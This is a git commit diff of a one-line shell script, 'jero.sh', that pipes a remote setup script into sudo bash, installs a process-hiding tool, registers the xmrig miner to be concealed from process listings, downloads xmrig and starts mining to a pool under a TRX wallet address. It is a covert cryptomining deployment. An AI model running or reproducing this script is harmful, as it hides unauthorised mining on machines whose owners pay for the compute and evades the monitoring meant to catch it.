ab8436b5b85a107a5414f32362f9e8dc96293af3
Nurultyas7979 <100073612+Nurultyas7979@users.noreply.github.com>
2022-02-20 19:16:03 +0700

    Update jero.sh

--- jero.sh
+++ jero.sh
@@ -1,3 +1,2 @@
-sudo -i
 sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && chmod +x xmrig &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.sani -p x
 
